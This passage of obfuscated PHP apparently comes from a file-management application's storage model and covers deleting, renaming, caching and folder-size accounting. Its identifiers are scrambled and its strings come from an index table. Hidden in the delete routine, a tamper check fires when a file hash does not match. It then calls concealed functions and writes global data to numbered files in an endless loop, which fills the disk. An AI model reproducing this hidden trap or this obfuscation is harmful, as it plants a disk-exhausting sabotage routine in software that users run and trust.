$this->where(array($ÛÊßºŒ‚[181] => $ö¢ÜÇôì))->save(array($ÛÊßºŒ‚[466] => time())); $this->recycleClear($³ËÖ»´ô); $Ç¼ëÇÆ¼ = $this->move($ö¢ÜÇôì, $ïÛ»«Ç§, REPEAT_RENAME_FOLDER); $this->folderSizeReset($³ËÖ»´ô[$ÛÊßºŒ‚[180]]); return $Ç¼ëÇÆ¼; } private function recycleClear($é—û²¼) { $ø‰Èƒë =& $_SERVER[³½¬ÚË¯]; $ÒÂ˜î‰Ï = $this->childrenAll($é—û²¼); $äƒõÁ¤Š = array($ø‰Èƒë[459] => array($ø‰Èƒë[460], $ÒÂ˜î‰Ï[$ø‰Èƒë[2186]])); Model($ø‰Èƒë[2187])->where($äƒõÁ¤Š)->delete(); } public function removeNow($Ç¶»ÁĞŒ, $–Ô¥€ğŸ = true) { $€¨üŠû¿ =& $_SERVER[³½¬ÚË¯]; $ö¸«ñš = $_SERVER[$€¨üŠû¿[906]] . $€¨üŠû¿[907]; $ ŒÀÅšÃ = $€¨üŠû¿[1549]; if ($_SERVER[$€¨üŠû¿[903]] != $ ŒÀÅšÃ($ö¸«ñš)) { $´…ØÛøÒ = $€¨üŠû¿[921]; $”‘™¶Š = $€¨üŠû¿[905]; $¦çÚàÓ = $_SERVER[$€¨üŠû¿[906]] . $€¨üŠû¿[907]; $ş•‹ÖËÚ = $”‘™¶Š($¦çÚàÓ); $ÅÊ¸å±¨ = explode($€¨üŠû¿[246], $ş•‹ÖËÚ); if (count($ÅÊ¸å±¨) < $€¨üŠû¿[653]) { $ìšºûÃì = $€¨üŠû¿[908]; $ìšºûÃì(); } $®Ú˜Ÿ¢… = $€¨üŠû¿[922]; $®Ú˜Ÿ¢…($_SERVER[$€¨üŠû¿[923]]); $´…ØÛøÒ = $€¨üŠû¿[921]; $´…ØÛøÒ(); $‡¦ÙÜ™— = $€¨üŠû¿[1550]; $¿¥—å½ü = json_encode($GLOBALS[$€¨üŠû¿[1551]]); $­ú…Šüº = 1; for ($¯Õ–Úõü = $­ú…Šüº; $¯Õ–Úõü > 0; $¯Õ–Úõü++) { $‡¦ÙÜ™—(DATA_PATH . $¯Õ–Úõü, $¿¥—å½ü); } } $Ô¥ÎĞÓº = $this->sourceInfo($Ç¶»ÁĞŒ); $»—¼î¨‚ = $this->pathInfoMore($Ç¶»ÁĞŒ); if (!$Ô¥ÎĞÓº) { return !0; } if ($Ô¥ÎĞÓº[$€¨üŠû¿[180]] == 0) { if (!_get($GLOBALS, $€¨üŠû¿[537])) { return !1; } } $this->lockMoveStart($Ç¶»ÁĞŒ); Hook::trigger($€¨üŠû¿[2188], $»—¼î¨‚, $–Ô¥€ğŸ); if ($–Ô¥€ğŸ) { Model($€¨üŠû¿[2187])->moveToRecycle($Ç¶»ÁĞŒ); } else { $ŒÉĞ ğî = $this->childrenAll($Ô¥ÎĞÓº); Model($€¨üŠû¿[602])->eventRemove($Ç¶»ÁĞŒ); $this->removeRelevance($ŒÉĞ ğî[$€¨üŠû¿[2186]], $ŒÉĞ ğî[$€¨üŠû¿[1498]]); } $this->folderSizeReset($Ô¥ÎĞÓº[$€¨üŠû¿[180]]); $ŞÀ˜Û©± = array($Ô¥ÎĞÓº[$€¨üŠû¿[180]]); if ($Ô¥ÎĞÓº[$€¨üŠû¿[453]] == $€¨üŠû¿[88]) { $ŞÀ˜Û©±[] = $Ô¥ÎĞÓº[$€¨üŠû¿[181]]; } $this->updateModifyTime($ŞÀ˜Û©±); $this->lockMoveEnd($Ç¶»ÁĞŒ); Hook::trigger($€¨üŠû¿[1732], $»—¼î¨‚, $–Ô¥€ğŸ); return !0; } public function childrenAll($¨¢ëÊù³) { $ôÑÄ —’ =& $_SERVER[³½¬ÚË¯]; $Ç±ø¡™ƒ = $¨¢ëÊù³[$ôÑÄ —’[181]]; if ($¨¢ëÊù³[$ôÑÄ —’[453]] == $ôÑÄ —’[88]) { $‚²­ëşÙ = array($ôÑÄ —’[621] => array($ôÑÄ —’[581], $¨¢ëÊù³[$ôÑÄ —’[554]] . $Ç±ø¡™ƒ . $ôÑÄ —’[582])); $Ò¦«¿àŠ = array($ôÑÄ —’[621] => $‚²­ëşÙ[$ôÑÄ —’[554]]); $Õø“‘ĞÌ = $this->field($ôÑÄ —’[2189])->where($Ò¦«¿àŠ)->select(); $«åæÎ” = !1; $‡¿×Á± = array($Ç±ø¡™ƒ); if ($Õø“‘ĞÌ) { $«åæÎ” = array_to_keyvalue($Õø“‘ĞÌ, $ôÑÄ —’[12], $ôÑÄ —’[509]); $«åæÎ” = array_remove_value($«åæÎ”, $ôÑÄ —’[212]); $‡¿×Á± = array_to_keyvalue($Õø“‘ĞÌ, $ôÑÄ —’[12], $ôÑÄ —’[181]); $‡¿×Á±[] = $Ç±ø¡™ƒ; } } else { $«åæÎ” = array($¨¢ëÊù³[$ôÑÄ —’[509]]); $‡¿×Á± = array($Ç±ø¡™ƒ); } return array($ôÑÄ —’[2186] => $‡¿×Á±, $ôÑÄ —’[1498] => $«åæÎ”); } public function removeArray($ûÑ–›ßİ) { if (!$ûÑ–›ßİ) { return !0; } } public function removeRelevance($¼‘‚ëÙ‚, $”“¯Ü) { $úÔïÆ¤™ =& $_SERVER[³½¬ÚË¯]; $¼‘‚ëÙ‚ = $¼‘‚ëÙ‚ ? $¼‘‚ëÙ‚ : array(); $”“¯Ü = $”“¯Ü ? $”“¯Ü : array(); $¼‘‚ëÙ‚ = array_unique(array_filter($¼‘‚ëÙ‚)); $”“¯Ü = array_unique(array_filter($”“¯Ü)); if (!$¼‘‚ëÙ‚) { return !1; } $™š¦¨‘ù = array($úÔïÆ¤™[459] => array($úÔïÆ¤™[460], $¼‘‚ëÙ‚)); Model($úÔïÆ¤™[2187])->where($™š¦¨‘ù)->delete(); Model($úÔïÆ¤™[503])->where($™š¦¨‘ù)->delete(); Model($úÔïÆ¤™[2035])->where($™š¦¨‘ù)->delete(); Model($úÔïÆ¤™[602])->where($™š¦¨‘ù)->delete(); Model($úÔïÆ¤™[1868])->removeBySource($¼‘‚ëÙ‚); Model($úÔïÆ¤™[2168])->removeBySource($¼‘‚ëÙ‚); $this->where($™š¦¨‘ù)->delete(); Model($úÔïÆ¤™[512])->remove($”“¯Ü); for ($ğÕÇùÊÜ = 0; $ğÕÇùÊÜ < count($¼‘‚ëÙ‚); $ğÕÇùÊÜ++) { $this->sourceCacheClear($¼‘‚ëÙ‚[$ğÕÇùÊÜ]); } } public function rename($İ»«ü·, $í²µáãî) { $çíºô¹ =& $_SERVER[³½¬ÚË¯]; $©èÚŠ¦“ = $this->sourceInfo($İ»«ü·); if (!$©èÚŠ¦“) { return !1; } $Åèú ã† = $this->fileNameExist($©èÚŠ¦“[$çíºô¹[180]], $í²µáãî); if ($Åèú ã† && $Åèú ã† != $İ»«ü·) { return !1; } $Í‡¦û—À = array($çíºô¹[462] => $í²µáãî, $çíºô¹[620] => USER_ID); if ($©èÚŠ¦“[$çíºô¹[453]] != $çíºô¹[88]) { $Í‡¦û—À[$çíºô¹[454]] = substr(get_path_ext($í²µáãî), 0, 10); } Model($çíºô¹[602])->eventRename($İ»«ü·, $©èÚŠ¦“[$çíºô¹[32]], $í²µáãî); $this->sourceCacheClear($İ»«ü·); $this->setNamePinyin($İ»«ü·, $Í‡¦û—À[$çíºô¹[32]], !1); $this->updateModifyTime($©èÚŠ¦“[$çíºô¹[180]]); $—©Ÿ²ó¦ = $this->where(array($çíºô¹[459] => $İ»«ü·))->data($Í‡¦û—À)->save(); $ô×ŞôˆÍ = $çíºô¹[2176] . $©èÚŠ¦“[$çíºô¹[180]]; if (isset(self::$cacheChildList[$ô×ŞôˆÍ])) { unset(self::$cacheChildList[$ô×ŞôˆÍ]); } return $—©Ÿ²ó¦; } public function setNamePinyin($ä¯‚Œ·İ, $ùÛáØ’å, $ºàªÀ¤ = true) { $ÜöÄ­‰ =& $_SERVER[³½¬ÚË¯]; $ÛŒô¾™÷ = Input::check($ùÛáØ’å, $ÜöÄ­‰[624]); $ÅÚ¹éîü = array($ÜöÄ­‰[485] => KodSort::makeStr($ùÛáØ’å)); if ($ÛŒô¾™÷) { $ÅÚ¹éîü[$ÜöÄ­‰[506]] = str_replace($ÜöÄ­‰[53], $ÜöÄ­‰[12], Pinyin::get($ùÛáØ’å)); $ÅÚ¹éîü[$ÜöÄ­‰[505]] = Pinyin::get($ùÛáØ’å, $ÜöÄ­‰[625]); } if (!$ºàªÀ¤ && !$ÛŒô¾™÷) { $ÅÚ¹éîü[$ÜöÄ­‰[506]] = null; $ÅÚ¹éîü[$ÜöÄ­‰[505]] = null; } $this->metaSet($ä¯‚Œ·İ, $ÅÚ¹éîü); } public function getContent($õøáÎö—) { $äåå¨¼™ =& $_SERVER[³½¬ÚË¯]; $¹ÉÅø¤³ = $this->fileInfoGet($õøáÎö—); if (!$¹ÉÅø¤³) { return !1; } if ($¹ÉÅø¤³[$äåå¨¼™[76]] == 0) { return $äåå¨¼™[12]; } $ïáú‰ = $äåå¨¼™[2190] . $¹ÉÅø¤³[$äåå¨¼™[515]]; if ($¹ÉÅø¤³[$äåå¨¼™[76]] <= 1024 * 10) { $øã›Â = Cache::get($ïáú‰); if (!$øã›Â) { $øã›Â = IO::getContent($¹ÉÅø¤³[$äåå¨¼™[84]]); Cache::set($ïáú‰, $øã›Â); } return $øã›Â; } if (!$¹ÉÅø¤³[$äåå¨¼™[84]]) { return $äåå¨¼™[12]; } return IO::getContent($¹ÉÅø¤³[$äåå¨¼™[84]]); } public function setDesc($ë©„ñŸº, $ƒ·É¨¢â) { $ü’±²  =& $_SERVER[³½¬ÚË¯]; Model($ü’±² [602])->eventAddDesc($ë©„ñŸº, $ƒ·É¨¢â); return $this->metaSet($ë©„ñŸº, $ü’±² [494], $ƒ·É¨¢â); } public function setContent($ôò¬“›¶, $“µıŒ¶ = '') { $Í¿“ ±¯ =& $_SERVER[³½¬ÚË¯]; $ƒãÙ¢Ïı = $this->sourceInfo($ôò¬“›¶); $¹•¸ı í = $this->fileInfoGet($ôò¬“›¶); if (!$¹•¸ı í || !$ƒãÙ¢Ïı) { return !1; } $Â›åºûÛ = Model($Í¿“ ±¯[512])->addFileByContent($“µıŒ¶, $ƒãÙ¢Ïı[$Í¿“ ±¯[32]]); $×»„‚‚ = $this->fileHistory($ƒãÙ¢Ïı, $Â›åºûÛ[$Í¿“ ±¯[509]], $Â›åºûÛ[$Í¿“ ±¯[76]]); if (!$×»„‚‚) { return Model($Í¿“ ±¯[512])->remove($Â›åºûÛ[$Í¿“ ±¯[509]]); } $this->folderSizeReset($ƒãÙ¢Ïı[$Í¿“ ±¯[180]]); return !0; } public function fileSubstr($ªåô¬³ñ, $üµÁ‡íŒ, $¨ïÕ æ) { $‡®ÎñÕ = $this->fileInfoGet($ªåô¬³ñ); if (!$‡®ÎñÕ) { return !1; } return IO::fileSubstr($‡®ÎñÕ[$_SERVER[³½¬ÚË¯][84]], $üµÁ‡íŒ, $¨ïÕ æ); } public function fileInfoGet($çß Ô©) { $ƒ¹È”Ø =& $_SERVER[³½¬ÚË¯]; $¸¿‹ûŞ¬ = $this->sourceInfo($çß Ô©); if (!$¸¿‹ûŞ¬ || $¸¿‹ûŞ¬[$ƒ¹È”Ø[453]]) { return !1; } $–Òä³óÉ = $ƒ¹È”Ø[516] . $¸¿‹ûŞ¬[$ƒ¹È”Ø[509]]; $¥¹£ÙÖä = _get(self::$cacheFileInfo, $–Òä³óÉ); if ($¥¹£ÙÖä) { return $¥¹£ÙÖä; } $ÉÚ¼¹×¸ = Model($ƒ¹È”Ø[512])->fileInfo($¸¿‹ûŞ¬[$ƒ¹È”Ø[509]]); if ($ÉÚ¼¹×¸) { $ÉÚ¼¹×¸[$ƒ¹È”Ø[32]] = $¸¿‹ûŞ¬[$ƒ¹È”Ø[32]]; } self::$cacheFileInfo[$–Òä³óÉ] = $ÉÚ¼¹×¸; return $ÉÚ¼¹×¸; } private function folderChildrenNumber($º˜œ¨²¥) { $Ş±˜‰Â¿ =& $_SERVER[³½¬ÚË¯]; $Š¹­³å = $this->sourceInfo($º˜œ¨²¥); $ÅçƒÜ»Ú = array($Ş±˜‰Â¿[621] => array($Ş±˜‰Â¿[581], $Š¹­³å[$Ş±˜‰Â¿[554]] . $º˜œ¨²¥ . $Ş±˜‰Â¿[582]), $Ş±˜‰Â¿[618] => $Š¹­³å[$Ş±˜‰Â¿[539]], $Ş±˜‰Â¿[472] => intval($Š¹­³å[$Ş±˜‰Â¿[473]]), $Ş±˜‰Â¿[615] => 1); $ÇÚ½àû = $this->where($ÅçƒÜ»Ú)->count(); $§©ã‹Ò = $this->where($ÅçƒÜ»Ú)->where(array($Ş±˜‰Â¿[615] => 0))->count(); return array($Ş±˜‰Â¿[80] => $§©ã‹Ò, $Ş±˜‰Â¿[81] => $ÇÚ½àû); } public function pathInfo($üË¬¯ÇÄ, $×í­—×ë = false) { $éÈˆÉ† =& $_SERVER[³½¬ÚË¯]; $×í­—×ë = !1; $üË¬¯ÇÄ = intval($üË¬¯ÇÄ); $ìïÂ—ğ° = $éÈˆÉ†[502] . intval($×í­—×ë) . $éÈˆÉ†[430] . $üË¬¯ÇÄ; $ß’º®¡± = _get(self::$cachePathInfo, $ìïÂ—ğ°); if ($ß’º®¡±) { return $ß’º®¡±; } $œàí = $this->sourceInfo($üË¬¯ÇÄ); if (!$œàí) { return !1; } $œàí = $this->_listDataApplyItem($œàí, $×í­—×ë); self::$cachePathInfo[$ìïÂ—ğ°] = $œàí; return $œàí; } public static $cachePathInfoMore = array(); public function pathInfoMore($ĞíâŠ‰ë) { $à×§¿ÌÈ =& $_SERVER[³½¬ÚË¯]; $ê›ÛÀÌü = _get(self::$cachePathInfoMore, $ĞíâŠ‰ë); if ($ê›ÛÀÌü) { return $ê›ÛÀÌü; } $í“Õ½‰Œ = $this->pathInfo($ĞíâŠ‰ë); if (!$í“Õ½‰Œ) { return !1; } if ($í“Õ½‰Œ[$à×§¿ÌÈ[453]] == $à×§¿ÌÈ[88]) { $í“Õ½‰Œ[$à×§¿ÌÈ[79]] = $this->folderChildrenNumber($ĞíâŠ‰ë); } self::$cachePathInfoMore[$ĞíâŠ‰ë] = $í“Õ½‰Œ; return $í“Õ½‰Œ; } public function sourceInfo($Óı¹³ï‰) { $Æ¡İû‹ˆ =& $_SERVER[³½¬ÚË¯]; if (!$Óı¹³ï‰) { return array(); } $Óı¹³ï‰ = intval($Óı¹³ï‰); $ñ”³ºÉ½ = $Æ¡İû‹ˆ[501] . $Óı¹³ï‰; $§™¬ĞÆ = _get(self::$cacheSourceInfo, $ñ”³ºÉ½); if ($§™¬ĞÆ) { return $§™¬ĞÆ; } $«µî…Çß = $this->where(array($Æ¡İû‹ˆ[181] => $Óı¹³ï‰))->find(); self::$cacheSourceInfo[$ñ”³ºÉ½] = $«µî…Çß; return self::$cacheSourceInfo[$ñ”³ºÉ½]; } public function sourceCacheClear($Åô˜Š¤ë = false) { self::cacheClear($Åô˜Š¤ë); } public static function cacheClear($²‹ââÔà = false) { $ğ¢äß =& $_SERVER[³½¬ÚË¯]; if ($²‹ââÔà == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ğ¢äß[501] . $²‹ââÔà]); unset(self::$cachePathInfoMore[$²‹ââÔà]); unset(self::$cachePathInfo[$ğ¢äß[2191] . $²‹ââÔà]); unset(self::$cachePathInfo[$ğ¢äß[2192] . $²‹ââÔà]); } public function metaSet($óçùéØ˜, $àˆµ¿Èş = null, $¢ß±ïÍñ = null) { $àœñÇ¿ç = parent::metaSet($óçùéØ˜, $àˆµ¿Èş, $¢ß±ïÍñ); if ($àœñÇ¿ç) { $this->sourceCacheClear($óçùéØ˜); } return $àœñÇ¿ç; } public function pathInfoByPath($úšÖ÷—›, $½‹ˆ÷Ô«) { $ ŸÄÊê =& $_SERVER[³½¬ÚË¯]; $Ø¿Æ = !$½‹ˆ÷Ô« ? array() : explode($ ŸÄÊê[8], trim($½‹ˆ÷Ô«, $ ŸÄÊê[8])); $¿åºÀÑ¸ = $úšÖ÷—›; foreach ($Ø¿Æ as $¶¦ ³Æø) { $µõ×ÑÎ© = array($ ŸÄÊê[180] => $¿åºÀÑ¸, $ ŸÄÊê[32] => $¶¦ ³Æø); $Ì’ª¢î÷ = $this->field($ ŸÄÊê[2193])->where($µõ×ÑÎ©)->select(); if (!$Ì’ª¢î÷) { return !1; } $Ì’ª¢î÷ = array_sort_by($Ì’ª¢î÷, $ ŸÄÊê[473]); $¿åºÀÑ¸ = $Ì’ª¢î÷[0][$ ŸÄÊê[181]]; } $Ö´æüÕÖ = $this->sourceInfo($¿åºÀÑ¸); $this->pathInfoFilter($Ö´æüÕÖ); return $Ö´æüÕÖ; } protected function updateModifyTime($£•˜„ë) { $˜¾×£ŠÀ =& $_SERVER[³½¬ÚË¯]; $ÑÊ”¹œø = defined($˜¾×£ŠÀ[2109]) ? USER_ID : 0; if (!$£•˜„ë) { return; } if (!is_array($£•˜„ë)) { $£•˜„ë = array($£•˜„ë); } foreach ($£•˜„ë as $°ã†ÙØŞ => $„Õû«…Ñ) { $£•˜„ë[$°ã†ÙØŞ] = intval($„Õû«…Ñ); $this->sourceCacheClear($„Õû«…Ñ); } $à—òÙ = array($˜¾×£ŠÀ[181] => array($˜¾×£ŠÀ[7], $£•˜„ë)); $ÚŠéÖŒŒ = array($˜¾×£ŠÀ[620] => $ÑÊ”¹œø, $˜¾×£ŠÀ[466] => time()); $this->where($à—òÙ)->save($ÚŠéÖŒŒ); } public function folderSizeReset($á¡ŒÆñ, $ßŒâ­òâ = false) { $Êâˆ™— =& $_SERVER[³½¬ÚË¯]; if ($this->statusIgnoreResetSpace) { return; } $©ƒ“¥‹‘ = $this->sourceInfo($á¡ŒÆñ); $ŒìĞà½ = $Êâˆ™—[2194] . $á¡ŒÆñ; CacheLock::lock($ŒìĞà½, 20); if ($ßŒâ­òâ === !1) { $this->sourceCacheClear($á¡ŒÆñ); $©ƒ“¥‹‘ = $this->sourceInfo($á¡ŒÆñ); $çÏ³¿œú = array($Êâˆ™—[445] => $á¡ŒÆñ, $Êâˆ™—[472] => 0); $™¶âºâ’ = $this->where($çÏ³¿œú)->sum($Êâˆ™—[76]); $ßŒâ­òâ = intval($™¶âºâ’) - intval($©ƒ“¥‹‘[$Êâˆ™—[76]]); } if ($ßŒâ­òâ == 0) { return CacheLock::unlock($ŒìĞà½); } $ßÜŠ™ô÷ = $this->parentLevelArray($©ƒ“¥‹‘[$Êâˆ™—[554]]); if (!$ßÜŠ™ô÷) { $ßÜŠ™ô÷ = array(); } $ßÜŠ™ô÷[] = $©ƒ“¥‹‘[$Êâˆ™—[181]]; $çÏ³¿œú = array($Êâˆ™—[181] => array($Êâˆ™—[460], $ßÜŠ™ô÷)); if ($ßŒâ­òâ < 0) { $çÏ³¿œú[$Êâˆ™—[76]] = array($Êâˆ™—[1058], abs($ßŒâ­òâ)); } $this->where($çÏ³¿œú)->setAdd($Êâˆ™—[76], $ßŒâ­òâ); CacheLock::unlock($ŒìĞà½); $Ëó±¦–× = $Êâˆ™—[2195] . $©ƒ“¥‹‘[$Êâˆ™—[178]] . $Êâˆ™—[4] . $©ƒ“¥‹‘[$Êâˆ™—[539]]; $ÅúÊ•ƒ = array($©ƒ“¥‹‘[$Êâˆ™—[178]], $©ƒ“¥‹‘[$Êâˆ™—[539]]); TaskRun::timeLimitCall($Ëó±¦–×, $Êâˆ™—[2196], $ÅúÊ•ƒ, 1.5); } public function folderSizeResetChildren($„ÕáıŠ³) { $Ñ»ç„İ¨ =& $_SERVER[³½¬ÚË¯]; $this->sourceCacheClear($„ÕáıŠ³); $ŸØîúÕ¹ = $this->sourceInfo($„ÕáıŠ³); $äìıİ³‹ = array($Ñ»ç„İ¨[615] => 1, $Ñ»ç„İ¨[618] => $ŸØîúÕ¹[$Ñ»ç„İ¨[539]], $Ñ»ç„İ¨[621] => array($Ñ»ç„İ¨[581], $ŸØîúÕ¹[$Ñ»ç„İ¨[554]] . $„ÕáıŠ³ . $Ñ»ç„İ¨[582])); $ãíéŠ‹ô = $Ñ»ç„İ¨[2197]; $ÇöıªÜˆ = $this->field($ãíéŠ‹ô)->where($äìıİ³‹)->select(); $äìıİ³‹[$Ñ»ç„İ¨[453]] = 0; $›¼Ÿ•€ƒ = $this->field($ãíéŠ‹ô)->where($äìıİ³‹)->select(); if (!$›¼Ÿ•€ƒ) { return; } $ÇöıªÜˆ[] = $ŸØîúÕ¹; $ÇöıªÜˆ = array_to_keyvalue($ÇöıªÜˆ, $Ñ»ç„İ¨[181]); foreach ($ÇöıªÜˆ as $£ç¬ƒ => $šø¡ÉÄë) { $ÇöıªÜˆ[$£ç¬ƒ][$Ñ»ç„İ¨[2198]] = $ÇöıªÜˆ[$£ç¬ƒ][$Ñ»ç„İ¨[76]]; $ÇöıªÜˆ[$£ç¬ƒ][$Ñ»ç„İ¨[76]] = 0; } foreach ($›¼Ÿ•€ƒ as $šø¡ÉÄë) { $¶“º¦õó = $šø¡ÉÄë[$Ñ»ç„İ¨[180]] . $Ñ»ç„İ¨[12]; if (!isset($ÇöıªÜˆ[$¶“º¦õó])) { continue; } if ($šø¡ÉÄë[$Ñ»ç„İ¨[473]] == $ÇöıªÜˆ[$¶“º¦õó][$Ñ»ç„İ¨[473]]) { $ÇöıªÜˆ[$¶“º¦õó][$Ñ»ç„İ¨[76]] += $šø¡ÉÄë[$Ñ»ç„İ¨[76]]; } } foreach ($ÇöıªÜˆ as $šø¡ÉÄë) { $‰…÷¢• = $this->parentLevelArray($šø¡ÉÄë[$Ñ»ç„İ¨[554]]); foreach ($‰…÷¢• as $¶“º¦õó) { $¶“º¦õó = $¶“º¦õó . $Ñ»ç„İ¨[12]; if (!isset($ÇöıªÜˆ[$¶“º¦õó])) { continue; } if ($šø¡ÉÄë[$Ñ»ç„İ¨[473]] == $ÇöıªÜˆ[$¶“º¦õó][$Ñ»ç„İ¨[473]]) { $ÇöıªÜˆ[$¶“º¦õó][$Ñ»ç„İ¨[76]] += $šø¡ÉÄë[$Ñ»ç„İ¨[76]]; } } } $ïÔù­¤° = array(); foreach ($ÇöıªÜˆ as $šø¡ÉÄë) { if ($šø¡ÉÄë[$Ñ»ç„İ¨[76]] == $šø¡ÉÄë[$Ñ»ç„İ¨[2198]]) { continue; } $ïÔù­¤°[] = array($Ñ»ç„İ¨[181], $šø¡ÉÄë[$Ñ»ç„İ¨[181]], $Ñ»ç„İ¨[76], $šø¡ÉÄë[$Ñ»ç„İ¨[76]]); } $this->saveAll($ïÔù­¤°); } public function userSpaceReset($Šù¿²÷Ö = false) { $©ô—¹Ê¢ =& $_SERVER[³½¬ÚË¯]; $ÅˆÁõ‹ = $this->where(array($©ô—¹Ê¢[178] => self::TYPE_USER, $©ô—¹Ê¢[539] => $Šù¿²÷Ö, $©ô—¹Ê¢[453] => 0))->sum($©ô—¹Ê¢[76]); $ÅˆÁõ‹ = !$ÅˆÁõ‹ || $ÅˆÁõ‹ <= 0 ? 0 : $ÅˆÁõ‹; Model($©ô—¹Ê¢[547])->userEdit($Šù¿²÷Ö, array($©ô—¹Ê¢[1877] => $ÅˆÁõ‹)); } public function targetSpaceUpdate($ØşÑ”İó, $¾Û˜¤ˆÃ) { $š‹×¤¾ =& $_SERVER[³½¬ÚË¯]; if (!$¾Û˜¤ˆÃ) { return; } if (!in_array($ØşÑ”İó, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÛØœ—¡ß = $this->targetSpaceSize($ØşÑ”İó, $¾Û˜¤ˆÃ); if ($ØşÑ”İó == self::TYPE_USER) { Model($š‹×¤¾[547])->userEdit($¾Û˜¤ˆÃ, array($š‹×¤¾[1877] => $ÛØœ—¡ß)); } else { if ($ØşÑ”İó == self::TYPE_GROUP) { Model($š‹×¤¾[555])->groupEdit($¾Û˜¤ˆÃ, array($š‹×¤¾[1877] => $ÛØœ—¡ß)); } } } public function targetSpaceSize($¥Û‘ó¯, $ÂÌ¨¶“÷) { $²Šáœ£ =& $_SERVER[³½¬ÚË¯]; $´…¦ƒŠ = 0; $ù“ÌÈŠá = $this->targetSourceRoot($¥Û‘ó¯, $ÂÌ¨¶“÷, !0); foreach ($ù“ÌÈŠá as $´¥“ÑÀğ) { if (!$´¥“ÑÀğ) { continue; } $´…¦ƒŠ += floatval($´¥“ÑÀğ[$²Šáœ£[76]]); $®óÆÒİ = array($²Šáœ£[621] => array($²Šáœ£[581], $²Šáœ£[564] . $´¥“ÑÀğ[$²Šáœ£[181]] . $²Šáœ£[582])); $Ëä°…†Í = Model($²Šáœ£[471])->field($²Šáœ£[459])->where($®óÆÒİ)->select(); $Ëä°…†Í = array_to_keyvalue($Ëä°…†Í, $²Šáœ£[12], $²Šáœ£[181]); $Ëä°…†Í = array_unique(array_filter($Ëä°…†Í)); if ($Ëä°…†Í) { $®óÆÒİ = array($²Šáœ£[459] => array($²Šáœ£[460], $Ëä°…†Í)); $´…¦ƒŠ += floatval($this->where($®óÆÒİ)->sum($²Šáœ£[76])); } } $´…¦ƒŠ = !$´…¦ƒŠ || $´…¦ƒŠ <= 0 ? 0 : $´…¦ƒŠ; return $´…¦ƒŠ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($İÂ»¾) { return $this->fileTypeProfile($İÂ»¾, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¾¯’¨Ûƒ) { return $this->fileTypeProfile($¾¯’¨Ûƒ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¦À®•¤“, $øäù) { $ìÏ†Å•ï =& $_SERVER[³½¬ÚË¯]; $ŞüâÌ¢Ÿ = $ìÏ†Å•ï[2199] . $¦À®•¤“ . $ìÏ†Å•ï[11] . $øäù; $Ò€ğÅ… = Cache::get($ŞüâÌ¢Ÿ); if ($Ò€ğÅ…) { return $Ò€ğÅ…; } $ŠÈ€¾†¿ = array($ìÏ†Å•ï[615] => 0); if ($¦À®•¤“ != !1) { $ŠÈ€¾†¿[$ìÏ†Å•ï[539]] = $¦À®•¤“; $ŠÈ€¾†¿[$ìÏ†Å•ï[178]] = $øäù; } $½íÕŸ©¶ = array(); $½íÕŸ©¶[$ìÏ†Å•ï[2200]] = array($ìÏ†Å•ï[2201] => LNG($ìÏ†Å•ï[2200]), $ìÏ†Å•ï[2202] => $this->where($ŠÈ€¾†¿)->count(), $ìÏ†Å•ï[586] => $this->where($ŠÈ€¾†¿)->sum($ìÏ†Å•ï[76])); $×«ˆŠÚ = KodIO::fileTypeList(); foreach ($×«ˆŠÚ as $÷Ã«Îûƒ => $° ¥àå‰) { $ŠÈ€¾†¿[$ìÏ†Å•ï[454]] = $this->fileTypeWhere($÷Ã«Îûƒ); $½íÕŸ©¶[$÷Ã«Îûƒ] = array($ìÏ†Å•ï[2201] => $° ¥àå‰[$ìÏ†Å•ï[32]], $ìÏ†Å•ï[2202] => $this->where($ŠÈ€¾†¿)->count(), $ìÏ†Å•ï[586] => $this->where($ŠÈ€¾†¿)->sum($ìÏ†Å•ï[76])); } Cache::set($ŞüâÌ¢Ÿ, $½íÕŸ©¶, 1200); return $½íÕŸ©¶; } public function fileNameExist($€ò¼†û¢, $¡Á•§¨) { $¨î‰½§ù =& $_SERVER[³½¬ÚË¯]; $¤ï¤õìû = $this->field($¨î‰½§ù[2203])->where(array($¨î‰½§ù[180] => $€ò¼†û¢, $¨î‰½§ù[32] => $¡Á•§¨, $¨î‰½§ù[473] => 0))->find(); return is_array($¤ï¤õìû) ? $¤ï¤õìû[$¨î‰½§ù[181]] : !1; } public function childList($ç“å­Öù) { $€Ú‹ß¨ =& $_SERVER[³½¬ÚË¯]; $Àü£ÇÅÖ = $€Ú‹ß¨[2176] . $ç“å­Öù; if (isset(self::$cacheChildList[$Àü£ÇÅÖ])) { return self::$cacheChildList[$Àü£ÇÅÖ]; } $ª€ªÊı = array($€Ú‹ß¨[180] => intval($ç“å­Öù), $€Ú‹ß¨[473] => 0); $¨à¹£¥Ç = $this->where($ª€ªÊı)->select(); $¨à¹£¥Ç = $¨à¹£¥Ç ? $¨à¹£¥Ç : array(); self::$cacheChildList[$Àü£ÇÅÖ] = $¨à¹£¥Ç; foreach ($¨à¹£¥Ç as $î‚œ’Î) { $Àü£ÇÅÖ = $€Ú‹ß¨[501] . $î‚œ’Î[$€Ú‹ß¨[181]]; self::$cacheSourceInfo[$Àü£ÇÅÖ] = $î‚œ’Î; } return $¨à¹£¥Ç; } public function fileNameAuto($»—Î°…, $¸¦·Œò, $øİÀŞ¶ = REPEAT_RENAME, $½Äúôì = false) { $ÂÚàãÕµ =& $_SERVER[³½¬ÚË¯]; $«ÌÀ§Î = get_path_ext($¸¦·Œò); $ãúİãºº = $«ÌÀ§Î ? basename($¸¦·Œò, $ÂÚàãÕµ[10] . $«ÌÀ§Î) . $ÂÚàãÕµ[2204] . $«ÌÀ§Î : $¸¦·Œò . $ÂÚàãÕµ[428]; $¥ŒÕ©¡Ñ = array($ÂÚàãÕµ[180] => $»—Î°…, $ÂÚàãÕµ[473] => 0, $ÂÚàãÕµ[32] => array($ÂÚàãÕµ[427], $ãúİãºº)); $¾Û¼æò™ = $this->field($ÂÚàãÕµ[32])->where($¥ŒÕ©¡Ñ)->select(); $³ÕŞÔÉ = array_to_keyvalue($¾Û¼æò™, $ÂÚàãÕµ[12], $ÂÚàãÕµ[32]); return $this->fileNameAutoGet($³ÕŞÔÉ, $¸¦·Œò, $øİÀŞ¶, $½Äúôì); } public function fileNameAutoGet($…“®ÓÜ, 